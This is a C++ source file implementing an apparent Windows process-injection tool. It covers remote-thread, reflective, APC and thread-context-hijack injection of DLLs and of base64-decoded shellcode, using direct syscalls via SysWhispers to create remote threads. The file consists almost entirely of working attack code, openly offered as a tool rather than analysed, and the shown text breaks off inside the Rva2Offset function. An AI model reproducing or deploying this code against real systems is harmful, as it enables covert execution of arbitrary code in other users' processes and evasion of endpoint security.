#include "./Injector.h"
#include "./S-Wisper.h"

#include "./utils/error.hpp"
#include "./utils/crypto.hpp"
#include "./utils/query.hpp"

#include <Windows.h>
#include <tlhelp32.h>

using namespace std;

Injector::Injector(string dll_path) {
    this->DllPath = dll_path;
    this->callback_ = nullptr;
    this->exist = this->bFileExists(this->DllPath);
    
    if (!exist) {
        Error::ErrorMsgBox(L"File Not Exist");
        return;
    }

    this->hNtDll = GetModuleHandle(L"ntdll.dll");
    if (this->hNtDll == nullptr) {
        Error::ErrorMsgBox(L"Wired, No ntdll");
        exit(0);
    }
    this->NtQuerySystemInformation = \
        reinterpret_cast<fnNtQuerySystemInformation>(GetProcAddress(this->hNtDll, "NtQuerySystemInformation"));

    if (!NtQuerySystemInformation) {
        Error::ErrorMsgBox(L"Failed to get NtQuerySystemInformation address");
        return;
    }
}

Injector::Injector() {
    this->DllPath = "";
    this->exist = FALSE;
    this->callback_ = nullptr;

    this->hNtDll = GetModuleHandle(L"ntdll.dll");
    if (this->hNtDll == nullptr) {
        Error::ErrorMsgBox(L"Wired, No ntdll");
        exit(0);
    }
    this->NtQuerySystemInformation = \
        reinterpret_cast<fnNtQuerySystemInformation>(GetProcAddress(this->hNtDll, "NtQuerySystemInformation"));

    if (!NtQuerySystemInformation) {
        Error::ErrorMsgBox(L"Failed to get NtQuerySystemInformation address");
        return;
    }
}

Injector::~Injector() {}

void Injector::dllPathSetter(string dll_path) {
    this->DllPath = dll_path;
    this->exist = this->bFileExists(this->DllPath);
    if (!exist) {
        Error::ErrorMsgBox(L"File Not Exist");
        return;
    }
}

void Injector::callBackSetter(CallbackFunction InjecMethod) {
    this->callback_ = InjecMethod;
}

/*                  Remote Thread Injection                  */
void Injector::remoteThreadInject(DWORD pid) {
    if (!this->bPreInjectCheck(pid))
        return;
    
    const SIZE_T dwAllocSize = this->DllPath.size() + 1;
    const int waitTime = 500;

    bool bRet;
    SIZE_T dwWriteSize = 0;
    HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
    LPVOID pAddress = VirtualAllocEx(hProcess, NULL, dwAllocSize, MEM_COMMIT, PAGE_READWRITE);

    if (pAddress == nullptr || hProcess == INVALID_HANDLE_VALUE) {
        Error::ErrorMsgBox(L"Allocate Address or Open Process Failed");
        return;
    }

    bRet = ::WriteProcessMemory(hProcess, pAddress, this->DllPath.c_str(), dwAllocSize, &dwWriteSize);
    if (!bRet) {
        Error::ErrorMsgBox(L"Write Process Failed");
        VirtualFreeEx(hProcess, pAddress, dwAllocSize, MEM_COMMIT);
        CloseHandle(hProcess);
        return;
    }

    HMODULE Ntdll = LoadLibraryA("kernel32.dll");
    if (Ntdll == INVALID_HANDLE_VALUE) {
        Error::ErrorMsgBox(L"Failed Loadlibrary kernel32");
        VirtualFreeEx(hProcess, pAddress, dwAllocSize, MEM_COMMIT);
        CloseHandle(hProcess);
        return;
    }

    LPVOID LoadLibraryBase = GetProcAddress(Ntdll, "LoadLibraryA");
    if (LoadLibraryBase == nullptr) {
        Error::ErrorMsgBox(L"No Such Function in Library");
        VirtualFreeEx(hProcess, pAddress, dwAllocSize, MEM_COMMIT);
        CloseHandle(hProcess);
        return;
    }

    HANDLE hRemoteProcess = NULL;
#ifdef _WIN64
    NTSTATUS status = Sw3NtCreateThreadEx(&hRemoteProcess, 0x1FFFFF, NULL, hProcess, (LPTHREAD_START_ROUTINE)LoadLibraryBase, pAddress, FALSE, NULL, NULL, NULL, NULL);
    if (hRemoteProcess == INVALID_HANDLE_VALUE || hRemoteProcess == NULL || status != STATUS_SUCCESS) {
        Error::ErrorMsgBox(L"Create Remote Thread Failed!");
        VirtualFreeEx(hProcess, pAddress, dwAllocSize, MEM_COMMIT);
        CloseHandle(hProcess);
        FreeModule(Ntdll);
        return;
    }
#else
#ifdef _WIN32
    hRemoteProcess = CreateRemoteThread(hProcess, NULL, NULL, (LPTHREAD_START_ROUTINE)LoadLibraryBase, pAddress, NULL, NULL);
    if (hRemoteProcess == INVALID_HANDLE_VALUE || hRemoteProcess == NULL) {
        Error::ErrorMsgBox(L"Create Remote Thread Failed!");
        VirtualFreeEx(hProcess, pAddress, dwAllocSize, MEM_COMMIT);
        CloseHandle(hProcess);
        FreeModule(Ntdll);
        return;
    }
#endif // _WIN32
#endif // _WIN64


    WaitForSingleObject(hRemoteProcess, 500);
    VirtualFreeEx(hProcess, pAddress, dwAllocSize, MEM_COMMIT);
    CloseHandle(hProcess);
    FreeModule(Ntdll);
}

void Injector::unInject(DWORD pid) {
    if (pid == 0)
        return;

    MODULEENTRY32 result = { sizeof(result) };
    if (!this->exist)
        return;
    if (!this->bGetModule(pid, result))
        return;

    HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
    if (hProcess == NULL) {
        Error::ErrorMsgBox(L" Open Process Failed:");
        return;
    }

    HMODULE hModule = GetModuleHandle(L"kernel32.dll");
    if (hModule == NULL) {
        Error::ErrorMsgBox(L"Get Module Failed:");
        CloseHandle(hProcess);
        return;
    }

    LPTHREAD_START_ROUTINE hFreeLib = (LPTHREAD_START_ROUTINE)GetProcAddress(hModule, "FreeLibrary");
    if (hFreeLib == NULL) {
        Error::ErrorMsgBox(L"Found FreeLibrary Failed:");

        CloseHandle(hProcess);
        FreeModule(hModule);
        return;
    }

    //HANDLE hThread = CreateRemoteThread(hProcess, NULL, 0, hFreeLib, result.modBaseAddr, 0, NULL);
    HANDLE hThread = NULL;
#ifdef _WIN64
    NTSTATUS status = Sw3NtCreateThreadEx(&hThread, 0x1FFFFF, NULL, hProcess, (LPTHREAD_START_ROUTINE)hFreeLib, result.modBaseAddr, FALSE, NULL, NULL, NULL, NULL);
    if (hThread == INVALID_HANDLE_VALUE || hThread == NULL || status != STATUS_SUCCESS) {
        Error::ErrorMsgBox(L"Free Remote Library Failed!:");

        CloseHandle(hProcess);
        return;
    }
#else
#ifdef _WIN32
    hThread = CreateRemoteThread(hProcess, NULL, 0, hFreeLib, result.modBaseAddr, 0, NULL);
    if (hThread == INVALID_HANDLE_VALUE || hThread == NULL) {
        Error::ErrorMsgBox(L"Free Remote Library Failed!:");

        CloseHandle(hProcess);
        return;
    }
#endif // _WIN32
#endif // _WIN64

    WaitForSingleObject(hThread, INFINITE);
    CloseHandle(hProcess);
    FreeModule(hModule);
    //CloseHandle(hFreeLib);
}


/*                  Reflect DLL Injection                  */
void Injector::reflectInject(DWORD pid) {
    if (!this->bPreInjectCheck(pid))
        return;

    HANDLE hFile = CreateFileA(this->DllPath.c_str(), GENERIC_READ, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hFile == INVALID_HANDLE_VALUE) {
        Error::ErrorMsgBox(L"Create File Failed");
        return;
    }
    DWORD dwFileSize = GetFileSize(hFile, NULL);
    if (dwFileSize == 0) {
        Error::ErrorMsgBox(L"File Size is Zero!");
        CloseHandle(hFile);
        return;
    }

    HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
    if (hProcess == INVALID_HANDLE_VALUE) {
        Error::ErrorMsgBox(L"Allocate Address or Open Process Failed");
        CloseHandle(hFile);
        return;
    }

    LPVOID pBase = VirtualAllocEx(hProcess, NULL, (SIZE_T)dwFileSize + 1, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
    if (pBase == NULL) {
        Error::ErrorMsgBox(L"Allocate Memory Failed");
        CloseHandle(hFile);
        CloseHandle(hProcess);
        return;
    }

    SIZE_T dwWriteSize = 0;
    char* buffer = new char[dwFileSize];
    DWORD dwReadSize;
    if (::ReadFile(hFile, buffer, dwFileSize, &dwReadSize, NULL) == FALSE) {
        Error::ErrorMsgBox(L"Failed to read the file.");
        delete[] buffer;
        VirtualFreeEx(hProcess, pBase, (SIZE_T)dwFileSize + 1, MEM_COMMIT);
        CloseHandle(hFile);
        CloseHandle(hProcess);
        return;
    }


    DWORD dwReflectiveLoaderOffset = this->dwGetOffset(buffer, (CHAR*)"ReflectiveLoader");
    if (dwReflectiveLoaderOffset == 0) {
        Error::ErrorMsgBox(L"Get Export Function Error");
        delete[] buffer;
        VirtualFreeEx(hProcess, pBase, (SIZE_T)dwFileSize + 1, MEM_COMMIT);
        CloseHandle(hFile);
        CloseHandle(hProcess);
        return;
    }

    bool bRet = WriteProcessMemory(hProcess, pBase, buffer, dwFileSize, &dwWriteSize);
    if (dwWriteSize != dwFileSize) {
        Error::ErrorMsgBox(L"File Load partitially");
        delete[] buffer;
        VirtualFreeEx(hProcess, pBase, (SIZE_T)dwFileSize + 1, MEM_COMMIT);
        CloseHandle(hFile);
        CloseHandle(hProcess);
        return;
    }
    //LPTHREAD_START_ROUTINE lpReflectiveLoader = (LPTHREAD_START_ROUTINE)((ULONG_PTR)pBase + dwReflectiveLoaderOffset);
    LPTHREAD_START_ROUTINE lpReflectiveLoader = reinterpret_cast<LPTHREAD_START_ROUTINE>(
                    reinterpret_cast<ULONG_PTR>(pBase)+ dwReflectiveLoaderOffset
        );

    HANDLE hThread = NULL;
#ifdef _WIN64
    NTSTATUS status = Sw3NtCreateThreadEx(&hThread, 0x1FFFFF, NULL, hProcess, (LPTHREAD_START_ROUTINE)lpReflectiveLoader, pBase, FALSE, NULL, NULL, NULL, NULL);
    if (hThread == INVALID_HANDLE_VALUE || hThread == NULL || status != STATUS_SUCCESS) {
        Error::ErrorMsgBox(L"Create Thread Failed");
        delete[] buffer;
        VirtualFreeEx(hProcess, pBase, (SIZE_T)dwFileSize + 1, MEM_COMMIT);
        CloseHandle(hFile);
        CloseHandle(hProcess);
        return;
    }
#else
#ifdef _WIN32
    // Win32 dont support syscall yet
    hThread = CreateRemoteThread(hProcess, NULL, 1024 * 1024, lpReflectiveLoader, pBase, (DWORD)NULL, NULL);
    if (hThread == INVALID_HANDLE_VALUE || hThread == NULL) {
        Error::ErrorMsgBox(L"Create Thread Failed");
        delete[] buffer;
        VirtualFreeEx(hProcess, pBase, (SIZE_T)dwFileSize + 1, MEM_COMMIT);
        CloseHandle(hFile);
        CloseHandle(hProcess);
        return;
    }
#endif // _WIN32

#endif // _WIN64


    WaitForSingleObject(hThread, 500);

    delete[] buffer;
    VirtualFreeEx(hProcess, pBase, (SIZE_T)dwFileSize + 1, MEM_COMMIT);
    CloseHandle(hFile);
    CloseHandle(hProcess);
    CloseHandle(hThread);
}


/*                  APC Dispatch Injection                  */
void Injector::apcInject(DWORD pid) {
    if (!this->bPreInjectCheck(pid))
        return;

    bool bRet;
    const SIZE_T dwAllocSize = this->DllPath.size() + 1;

    SIZE_T dwWriteSize = 0;
    HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
    LPVOID pAddress = VirtualAllocEx(hProcess, NULL, dwAllocSize, MEM_COMMIT, PAGE_READWRITE);
    if (pAddress == nullptr || hProcess == INVALID_HANDLE_VALUE) {
        Error::ErrorMsgBox(L"Allocate Address or Open Process Failed");
        return;
    }

    bRet = WriteProcessMemory(hProcess, pAddress, this->DllPath.c_str(), this->DllPath.size() + 1, &dwWriteSize);
    if (!bRet) {
        Error::ErrorMsgBox(L"Write Process Failed");
        VirtualFreeEx(hProcess, pAddress, dwAllocSize, MEM_COMMIT);
        CloseHandle(hProcess);
        return;
    }

    HMODULE Ntdll = LoadLibraryA("kernel32.dll");
    if (Ntdll == INVALID_HANDLE_VALUE) {
        Error::ErrorMsgBox(L"Failed Loadlibrary kernel32");
        VirtualFreeEx(hProcess, pAddress, dwAllocSize, MEM_COMMIT);
        CloseHandle(hProcess);
        return;
    }

    LPVOID LoadLibraryBase = GetProcAddress(Ntdll, "LoadLibraryA");
    if (LoadLibraryBase == nullptr) {
        Error::ErrorMsgBox(L"No Such Function in Library");
        VirtualFreeEx(hProcess, pAddress, dwAllocSize, MEM_COMMIT);
        CloseHandle(hProcess);
        return;
    }

    // loop process -> then loop thread
    ULONG bufferSize = 0;
    HANDLE hThread;
    std::vector<BYTE> buffer;
    if (this->NtQuerySystemInformation == nullptr) {
        Error::ErrorMsgBox(L"NtQuerySystemInformation is NULL");
        VirtualFreeEx(hProcess, pAddress, dwAllocSize, MEM_COMMIT);
        CloseHandle(hProcess);
        return;
    }
    NTSTATUS status = this->NtQuerySystemInformation(SystemProcessInformation, NULL, 0, &bufferSize);
    bool bStat = FALSE;

    buffer.resize(bufferSize);
    status = NtQuerySystemInformation(SystemProcessInformation, buffer.data(), bufferSize, &bufferSize);
    if (!NT_SUCCESS(status)) {
        Error::ErrorMsgBox(L"NtQuerySystemInformation failed with status");
        return;
    }

    PMySYSTEM_PROCESS_INFORMATION processInfo = reinterpret_cast<PMySYSTEM_PROCESS_INFORMATION>(buffer.data());
    for (; processInfo; ) {
        if (reinterpret_cast<DWORD>(processInfo->ProcessId) == pid) {
        //if (DWORD(processInfo->ProcessId) == pid) {
            // loop thread
            for (ULONG i = 0; i < processInfo->NumberOfThreads; i++) {
                hThread = OpenThread(
                    PROCESS_ALL_ACCESS, 
                    FALSE, 
                    reinterpret_cast<DWORD>(processInfo->Threads[i].ClientId.UniqueThread));
                if (hThread == INVALID_HANDLE_VALUE || hThread == NULL) {
                    continue;
                }
                DWORD dwRet = QueueUserAPC((PAPCFUNC)LoadLibraryBase, hThread, (ULONG_PTR)pAddress);
                if (dwRet > 0)	bStat = TRUE;
                CloseHandle(hThread);
                break;
            }
            break;
        }
        if (processInfo->NextEntryOffset == 0)
            break;
        //processInfo = (PSYSTEM_PROCESS_INFORMATION)((BYTE*)processInfo + processInfo->NextEntryOffset);
        processInfo = reinterpret_cast<PMySYSTEM_PROCESS_INFORMATION>(
            reinterpret_cast<PBYTE>(processInfo) + processInfo->NextEntryOffset
            );
    }
    if (!bStat)
        Error::ErrorMsgBox(L"Apc Inject Failed\nAll thread can't be inject");
    VirtualFreeEx(hProcess, pAddress, dwAllocSize, MEM_COMMIT);
    CloseHandle(hProcess);
}



/*                  List Injectable Process                  */
std::vector<ProcessInfo> Injector::injectList() {
    std::vector<ProcessInfo> procInfo;

    // loop process -> then loop thread
    ULONG bufferSize = 0;
    HANDLE hProcess = NULL;
    std::vector<BYTE> buffer;
    if (this->NtQuerySystemInformation == nullptr) {
        Error::ErrorMsgBox(L"NtQuerySystemInformation is NULL");
        return procInfo;
    }
    NTSTATUS status = this->NtQuerySystemInformation(SystemProcessInformation, NULL, 0, &bufferSize);
    BOOL bWow64 = FALSE;

    buffer.resize(bufferSize);
    status = NtQuerySystemInformation(SystemProcessInformation, buffer.data(), bufferSize, &bufferSize);
    if (!NT_SUCCESS(status)) {
        //Error::ErrorMsgBox(L"NtQuerySystemInformation failed with status");
        return procInfo;
    }
    PMySYSTEM_PROCESS_INFORMATION processInfo = reinterpret_cast<PMySYSTEM_PROCESS_INFORMATION>(buffer.data());
    for (;
        processInfo;) 
    {
        hProcess = OpenProcess(PROCESS_QUERY_INFORMATION, FALSE, reinterpret_cast<DWORD>(processInfo->ProcessId));
        if (hProcess == NULL || hProcess == INVALID_HANDLE_VALUE) {
            if (processInfo->NextEntryOffset == 0)
                break;
            processInfo = reinterpret_cast<PMySYSTEM_PROCESS_INFORMATION>(
                reinterpret_cast<PBYTE>(processInfo) + processInfo->NextEntryOffset
                );
            continue;
        }
        if (IsWow64Process(hProcess, &bWow64)) {
#ifdef _WIN64
            if (!bWow64)
                procInfo.push_back(
                    ProcessInfo{ reinterpret_cast<DWORD>(processInfo->ProcessId) , processInfo->ImageName.Buffer });

#elif _WIN32
            if (bWow64)
                procInfo.push_back(
                    ProcessInfo{ reinterpret_cast<DWORD>(processInfo->ProcessId) , processInfo->ImageName.Buffer });
#else
            Error::ErrorMsgBox(L"Only Support i386 & amd64 arch");
#endif
        }
        CloseHandle(hProcess);
        if (processInfo->NextEntryOffset == 0)
            break;
        processInfo = reinterpret_cast<PMySYSTEM_PROCESS_INFORMATION>(
            reinterpret_cast<PBYTE>(processInfo) + processInfo->NextEntryOffset
            );
    }

    //std::reverse(procInfo.begin(), procInfo.end());
    //note: 删除原因-刷新太快
    return procInfo;
}


/*                  Inject With Shellcode                  */
void Injector::shellcodeInject(string basedsc, DWORD pid) {
    BOOL bRet;

    string shellcode = Crypto::Base64Decode(basedsc);
    HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
    DWORD size = shellcode.size() + 1;
    LPVOID pAddress = VirtualAllocEx(hProcess, NULL, size, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
    if (pAddress == nullptr || hProcess == INVALID_HANDLE_VALUE) {
        Error::ErrorMsgBox(L"Allocate Address or Open Process Failed");
        return;
    }

    bRet = WriteProcessMemory(hProcess, pAddress, shellcode.c_str(), static_cast<SIZE_T>(size) - 1, NULL);
    if (!bRet) {
        Error::ErrorMsgBox(L"Write Memory Failed:");

        CloseHandle(hProcess);
        VirtualFree(pAddress, shellcode.size() + 1, MEM_COMMIT);
        return;
    }

    //HANDLE hRemoteProcess = CreateRemoteThread(hProcess, NULL, NULL, (LPTHREAD_START_ROUTINE)pAddress, NULL, NULL, NULL);
    HANDLE hRemoteProcess = NULL;
#ifdef _WIN64
    NTSTATUS status = Sw3NtCreateThreadEx(&hRemoteProcess, 0x1FFFFF, NULL, hProcess, (LPTHREAD_START_ROUTINE)pAddress, NULL, FALSE, NULL, NULL, NULL, NULL);
    if (hRemoteProcess == INVALID_HANDLE_VALUE || hRemoteProcess == NULL || status != STATUS_SUCCESS) {
        Error::ErrorMsgBox(L"Create Remote Thread Failed!:");

        VirtualFreeEx(hProcess, pAddress, 0x300, MEM_COMMIT);
        CloseHandle(hProcess);
        return;
    }
#else
#ifdef _WIN32
    hRemoteProcess = CreateRemoteThread(hProcess, NULL, NULL, (LPTHREAD_START_ROUTINE)pAddress, NULL, NULL, NULL);
    if (hRemoteProcess == INVALID_HANDLE_VALUE || hRemoteProcess == NULL) {
        Error::ErrorMsgBox(L"Create Remote Thread Failed!:");

        VirtualFreeEx(hProcess, pAddress, 0x300, MEM_COMMIT);
        CloseHandle(hProcess);
        return;
    }
#endif // _WIN32

#endif // _WIN64

    WaitForSingleObject(hRemoteProcess, INFINITE);
    VirtualFreeEx(hProcess, pAddress, shellcode.size() + 1, MEM_COMMIT);
    CloseHandle(hProcess);
}


/*                  Inject Shellcode With APC Dispatch                 */
//TODO:
void Injector::apcShellcodeInject(string basedsc, DWORD pid) {
    BOOL bRet;

    string shellcode = Crypto::Base64Decode(basedsc);
    HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
    DWORD size = shellcode.size() + 1;
    LPVOID pAddress = VirtualAllocEx(hProcess, NULL, size, MEM_COMMIT, PAGE_READWRITE);//???? Sth intresting happend here Why need READ
    if (pAddress == nullptr || hProcess == INVALID_HANDLE_VALUE) {
        Error::ErrorMsgBox(L"Allocate Address or Open Process Failed:");
        return;
    }

    bRet = WriteProcessMemory(hProcess, pAddress, shellcode.c_str(), static_cast<SIZE_T>(size) - 1, NULL);
    if (!bRet) {
        Error::ErrorMsgBox(L"Write Memory Failed:");

        CloseHandle(hProcess);
        VirtualFree(pAddress, shellcode.size() + 1, MEM_COMMIT);
        return;
    }
    shellcode = "\x00\x00\x00\x00";
    // loop process -> then loop thread
    ULONG bufferSize = 0;
    HANDLE hThread;
    std::vector<BYTE> buffer;
    if (this->NtQuerySystemInformation == nullptr) {
        Error::ErrorMsgBox(L"NtQuerySystemInformation is NULL");
        VirtualFreeEx(hProcess, pAddress, size, MEM_COMMIT);
        CloseHandle(hProcess);
        return;
    }
    NTSTATUS status = this->NtQuerySystemInformation(SystemProcessInformation, NULL, 0, &bufferSize);
    bool bStat = FALSE;

    buffer.resize(bufferSize);
    status = NtQuerySystemInformation(SystemProcessInformation, buffer.data(), bufferSize, &bufferSize);
    if (!NT_SUCCESS(status)) {
        return;
    }

    PMySYSTEM_PROCESS_INFORMATION processInfo = reinterpret_cast<PMySYSTEM_PROCESS_INFORMATION>(buffer.data());
    for (; processInfo; ) {
        if (reinterpret_cast<DWORD>(processInfo->ProcessId) == pid) {
                // loop thread
            for (ULONG i = 0; i < processInfo->NumberOfThreads; i++) {
                hThread = OpenThread(
                    PROCESS_ALL_ACCESS,
                    FALSE,
                    reinterpret_cast<DWORD>(processInfo->Threads[i].ClientId.UniqueThread));
                if (hThread == INVALID_HANDLE_VALUE || hThread == NULL) {
                    continue;
                }
                
                DWORD lpflOldProtect;
                VirtualProtectEx(hProcess, pAddress, (SIZE_T)size + 1, PAGE_EXECUTE, &lpflOldProtect);
                DWORD dwRet = QueueUserAPC((PAPCFUNC)pAddress, hThread, NULL);

                if (dwRet > 0)	bStat = TRUE;
                CloseHandle(hThread);
                break;
            }
            break;
        }
        if (processInfo->NextEntryOffset == 0)
            break;
        //processInfo = (PSYSTEM_PROCESS_INFORMATION)((BYTE*)processInfo + processInfo->NextEntryOffset);
        processInfo = reinterpret_cast<PMySYSTEM_PROCESS_INFORMATION>(
            reinterpret_cast<PBYTE>(processInfo) + processInfo->NextEntryOffset
            );
    }
    if (!bStat)
        Error::ErrorMsgBox(L"Apc Inject Shellcode Failed\nAll thread can't be inject");
}


/*                  Inject Shellcode With Context Resume                 */
//TODO:
void Injector::contextShellcodeInject(string basedsc, DWORD pid) {
    BOOL bRet;

    string shellcode = Crypto::Base64Decode(basedsc);
    HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
    DWORD size = shellcode.size() + 1;
    LPVOID pAddress = VirtualAllocEx(hProcess, NULL, size, MEM_COMMIT, PAGE_READWRITE);
    if (pAddress == nullptr || hProcess == INVALID_HANDLE_VALUE) {
        Error::ErrorMsgBox(L"Allocate Address or Open Process Failed:");
        return;
    }

    bRet = WriteProcessMemory(hProcess, pAddress, shellcode.c_str(), static_cast<SIZE_T>(size) - 1, NULL);
    if (!bRet) {
        Error::ErrorMsgBox(L"Write Memory Failed:");

        CloseHandle(hProcess);
        VirtualFree(pAddress, (SIZE_T)shellcode.size() + 1, MEM_COMMIT);
        return;
    }
    shellcode = "\x00\x00\x00\x00";
    ULONG bufferSize = 0;
    HANDLE hThread;
    std::vector<BYTE> buffer;
    if (this->NtQuerySystemInformation == nullptr) {
        Error::ErrorMsgBox(L"NtQuerySystemInformation is NULL");
        VirtualFreeEx(hProcess, pAddress, size, MEM_COMMIT);
        CloseHandle(hProcess);
        return;
    }
    NTSTATUS status = this->NtQuerySystemInformation(SystemProcessInformation, NULL, 0, &bufferSize);
    bool bStat = FALSE;

    buffer.resize(bufferSize);
    status = NtQuerySystemInformation(SystemProcessInformation, buffer.data(), bufferSize, &bufferSize);
    if (!NT_SUCCESS(status)) {
        return;
    }

    DWORD dwRet = 0;
    CONTEXT context = { 0 };
    context.ContextFlags = CONTEXT_CONTROL;

    PMySYSTEM_PROCESS_INFORMATION processInfo = reinterpret_cast<PMySYSTEM_PROCESS_INFORMATION>(buffer.data());
    for (; processInfo; ) {
        if (reinterpret_cast<DWORD>(processInfo->ProcessId) == pid) {
            // loop thread
            for (ULONG i = 0; i < processInfo->NumberOfThreads; i++) {
                hThread = OpenThread(
                    PROCESS_ALL_ACCESS,
                    FALSE,
                    reinterpret_cast<DWORD>(processInfo->Threads[i].ClientId.UniqueThread));
                if (hThread == INVALID_HANDLE_VALUE || hThread == NULL) {
                    continue;
                }
                
                ///////// FUNCTIONAL CODE
                
                DWORD lpflOldProtect;
                VirtualProtectEx(hProcess, pAddress, (SIZE_T)size + 1, PAGE_EXECUTE, &lpflOldProtect);
                dwRet = SuspendThread(hThread);
                if (dwRet == (DWORD)-1) {
                    Error::ErrorMsgBox(L" Suspen Thread Failed: ");

                    CloseHandle(hThread);
                    continue;
                }

                dwRet = GetThreadContext(hThread, &context);
                if (!dwRet) {
                    Error::ErrorMsgBox(L"Get Thread Context Failed:");

                    CloseHandle(hThread);
                    continue;
                }

#ifdef _WIN64
                context.Rip = (DWORD64)pAddress;
#else
                context.Eip = (DWORD)pAddress;
#endif // _WIN64
                dwRet = SetThreadContext(hThread, &context);
                if (!dwRet) {
                    Error::ErrorMsgBox(L"Set Thread Context Failed:");

                    CloseHandle(hThread);
                    continue;
                }

                ResumeThread(hThread);
                if (dwRet == (DWORD)-1) {
                    Error::ErrorMsgBox(L"Resume Thread Failed:");

                    CloseHandle(hThread);
                    continue;
                }

                ///////// FUNCTIONAL CODE
                CloseHandle(hThread);
                break;
            }
            break;
        }
        if (processInfo->NextEntryOffset == 0)
            break;
        //processInfo = (PSYSTEM_PROCESS_INFORMATION)((BYTE*)processInfo + processInfo->NextEntryOffset);
        processInfo = reinterpret_cast<PMySYSTEM_PROCESS_INFORMATION>(
            reinterpret_cast<PBYTE>(processInfo) + processInfo->NextEntryOffset
            );
    }

}



/*                  Some Gadget                  */
bool Injector::bFileExists(string filePath) {
    DWORD fileAttributes = GetFileAttributesA(filePath.c_str());

    if (fileAttributes != INVALID_FILE_ATTRIBUTES &&
        !(fileAttributes & FILE_ATTRIBUTE_DIRECTORY)) {
        return true;
    }
    return false;
}

bool Injector::bPreInjectCheck(DWORD pid) {
    if (!this->bFileExists(this->DllPath)) {
        Error::ErrorMsgBox(L"File Not Exist");
        return FALSE;
    }
    
    if (pid == 0) {
        Error::ErrorMsgBox(L"Invalid PID");
        return FALSE;
    }

    if (!this->bInjectable(pid)) {
        Error::ErrorMsgBox(L"Not Injectable");
        return FALSE;
    }
    return TRUE;
}

bool Injector::bInjectable(DWORD pid) {
    HANDLE processHandle = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);

    if (processHandle == NULL) {
        //Error::ErrorMsgBox(L"Failed to open process:");
        return false;
    }

    // 在目标进程中分配内存
    LPVOID remoteMemory = VirtualAllocEx(processHandle, nullptr, sizeof(DWORD), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);

    if (remoteMemory == nullptr) {
        //Error::ErrorMsgBox(L"Failed to allocate remote memory:");

        CloseHandle(processHandle);
        return false;
    }

    // 关闭句柄和释放内存
    VirtualFreeEx(processHandle, remoteMemory, 0, MEM_RELEASE);
    CloseHandle(processHandle);

    return true;
}

bool Injector::bGetModule(DWORD pid, MODULEENTRY32& result) {
    BOOL bRet = FALSE;
    HANDLE hSnapshot;

    hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPMODULE, pid);
    if (hSnapshot == INVALID_HANDLE_VALUE) {
        Error::ErrorMsgBox(L" Create Snap Failed:");

        return FALSE;
    }


    bRet = Module32First(hSnapshot, &result);
    for (; bRet; bRet = Module32Next(hSnapshot, &result))
    {
        // 将宽字符数组转为窄字符数组
        size_t bufferSize = wcslen(result.szExePath) + 1;
        char convertedWideStr[0x1000];
        //wcstombs_s(convertedWideStr, result.szExePath, bufferSize);
        wcstombs_s(nullptr, convertedWideStr, bufferSize, result.szExePath, _TRUNCATE);
        if (!strcmp(convertedWideStr, this->DllPath.c_str()))
        {
            bRet = TRUE;
            break;
        }
    }
    CloseHandle(hSnapshot);
    if (!bRet)
    Error::WarnMsgBox(L"DLL In Process Not Found");

    return bRet;

}

DWORD Injector::dwGetOffset(HANDLE Image, CHAR* FuncName) {
    // 本段代码参考了著名反射式DLL注入项目
    // https://github.com/stephenfewer/ReflectiveDLLInjection


    UINT_PTR uiBaseAddress = 0;
    UINT_PTR uiExportDir = 0;
    UINT_PTR uiNameArray = 0;
    UINT_PTR uiAddressArray = 0;
    UINT_PTR uiNameOrdinals = 0;
    DWORD dwCounter = 0;

    uiBaseAddress = (UINT_PTR)Image;
    // get the File Offset of the modules NT Header
    uiExportDir = uiBaseAddress + ((PIMAGE_DOS_HEADER)uiBaseAddress)->e_lfanew;
    // uiNameArray = the address of the modules export directory entry
    uiNameArray = (UINT_PTR) & ((PIMAGE_NT_HEADERS)uiExportDir)->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT];

    // get the File Offset of the export directory
    uiExportDir = uiBaseAddress + this->Rva2Offset(((PIMAGE_DATA_DIRECTORY)uiNameArray)->VirtualAddress, uiBaseAddress);

    // get the File Offset for the array of name pointers
    uiNameArray = uiBaseAddress + this->Rva2Offset(((PIMAGE_EXPORT_DIRECTORY)uiExportDir)->AddressOfNames, uiBaseAddress);

    // get the File Offset for the array of addresses
    uiAddressArray = uiBaseAddress + this->Rva2Offset(((PIMAGE_EXPORT_DIRECTORY)uiExportDir)->AddressOfFunctions, uiBaseAddress);

    // get the File Offset for the array of name ordinals
    uiNameOrdinals = uiBaseAddress + this->Rva2Offset(((PIMAGE_EXPORT_DIRECTORY)uiExportDir)->AddressOfNameOrdinals, uiBaseAddress);

    // get a counter for the number of exported functions...
    dwCounter = ((PIMAGE_EXPORT_DIRECTORY)uiExportDir)->NumberOfNames;

    // loop through all the exported functions to find the ReflectiveLoader
    while (dwCounter--)
    {
        char* cpExportedFunctionName = (char*)(uiBaseAddress + this->Rva2Offset(DEREF_32(uiNameArray), uiBaseAddress));

        //这里就开始比较导出函数的函数名称
        //if (strstr(cpExportedFunctionName, "ReflectiveLoader") != NULL)
        if (strstr(cpExportedFunctionName, FuncName) != NULL)
        {
            // get the File Offset for the array of addresses
            uiAddressArray = uiBaseAddress + this->Rva2Offset(((PIMAGE_EXPORT_DIRECTORY)uiExportDir)->AddressOfFunctions, uiBaseAddress);

            // use the functions name ordinal as an index into the array of name pointers
            uiAddressArray += (DEREF_16(uiNameOrdinals) * sizeof(DWORD));

            // return the File Offset to the ReflectiveLoader() functions code...
            return this->Rva2Offset(DEREF_32(uiAddressArray), uiBaseAddress);
        }
        // get the next exported function name
        uiNameArray += sizeof(DWORD);

        // get the next exported function name ordinal
        uiNameOrdinals += sizeof(WORD);
    }

    return 0;
}

DWORD Injector::Rva2Offset(DWORD dwRva, UINT_PTR uiBaseAddress)
{
    WORD wIndex = 0;
